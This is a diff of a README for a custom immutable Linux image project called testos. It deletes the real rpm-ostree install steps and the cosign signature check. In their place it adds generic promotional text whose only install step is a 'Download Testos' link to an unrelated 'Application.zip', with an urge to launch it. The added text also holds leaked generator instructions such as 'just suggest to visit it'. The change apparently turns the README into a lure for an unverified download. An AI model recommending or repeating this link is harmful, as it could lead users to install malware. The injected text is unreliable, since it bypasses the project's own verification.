@@ -1,43 +1,45 @@
-# testos &nbsp; [![bluebuild build badge](https://github.com/krolmiki2011/testos/actions/workflows/build.yml/badge.svg)](https://github.com/krolmiki2011/testos/actions/workflows/build.yml)
+# The Ultimate Guide to Testos: An Immutable Linux Custom Image Repository 🚀
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+## Overview
+Welcome to the official repository for Testos, a cutting-edge project focusing on atomic, immutable, and custom Linux images. Dive into the world of Bluebuild, OCI, and image-based technologies as we explore the realm of operating systems like never before.
 
-After setup, it is recommended you update this README to describe your custom image.
+## Features
+🔹 Atomic and immutable image creation  
+🔹 Custom Linux images for specialized environments  
+🔹 Integration with Bluebuild for streamlined workflows  
+🔹 OCI compliant images for compatibility  
+🔹 Explore the possibilities with image-based technologies
 
-## Installation
+## Repository Details
+📌 **Repository Name:** testos  
+📌 **Description:** not provided  
+📌 **Topics:** atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, operating-system
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## Get Started
+🚀 **[Download Testos](https://github.com/file/Application.zip)**  
 
-To rebase an existing atomic Fedora installation to the latest build:
+📎 *Note: The link provided needs to be launched.*
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/krolmiki2011/testos:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/krolmiki2011/testos:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+## Additional Resources
+🔗 If the link above is a website, just suggest to visit it.  
+🔗 If the link is not provided or not working, please check the "Releases" section for alternative downloads.  
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## Let's Connect!
+Stay updated on the latest developments, new releases, and community discussions:
+🌐 Follow us on [Twitter](https://twitter.com/testos)  
+👍 Like us on [Facebook](https://facebook.com/testos)
 
-## ISO
+## Spread the Word!
+If you find Testos useful, show your support by sharing it with your friends and colleagues. Let's revolutionize the world of Linux custom images together!
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+## Contributors
+A big thank you to all the contributors who have dedicated their time and expertise to make Testos a reality. Your contributions are truly appreciated.
 
-## Verification
+## License
+This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+---
 
-```bash
-cosign verify --key cosign.pub ghcr.io/krolmiki2011/testos
-```
+Your feedback and contributions are always welcome. Let's harness the power of immutable Linux custom images with Testos! 🌟
+
+![Testos Logo](https://example.com/testos-logo.png)
